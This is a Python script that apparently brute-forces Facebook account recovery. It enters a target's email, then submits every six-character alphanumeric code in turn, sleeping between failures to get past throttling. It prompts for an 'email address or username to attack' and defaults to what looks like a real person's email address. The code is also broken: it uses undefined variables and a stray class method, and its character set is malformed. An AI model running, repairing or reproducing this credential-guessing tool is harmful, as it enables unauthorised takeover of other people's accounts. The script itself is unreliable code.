import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
import re
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
  browser.select_form(nr=0)
  browser.form['email'] = email 
  browser.submit()
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  check1 = soup.find(string("Try another way"))
  check2 = soup.find(string("Try another way"))
  browser.select_form(nr=0)
  for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
    if counter <= codex:
      x = (''.join(map(str, combination)))
      codex += 1
    else:
      try:
        while check1 != "None":
          x = (''.join(map(str, combination)))
          browser.form['pass'] = x
          browser.submit()
          test1 = (x, " Failed")
          test2 = (x, " Succeded")
          counter += 1
          yo = h.join(test1)
          yo2 = h.join(test2)
          response1 = browser.response()
          soup = BeautifulSoup(response1, 'html.parser')
          check1 = soup.find(string="Try another way")
          if check1 == check2:
            print(test1)
            sleepy(30)
          else:
            print("Possible success")
            print(test2)
            raise
      except:
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
        with open("output1.txt", "w") as file:
          file.write(str(soup))
        print(counter)

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 0)
fb_hack(ehack, reset)
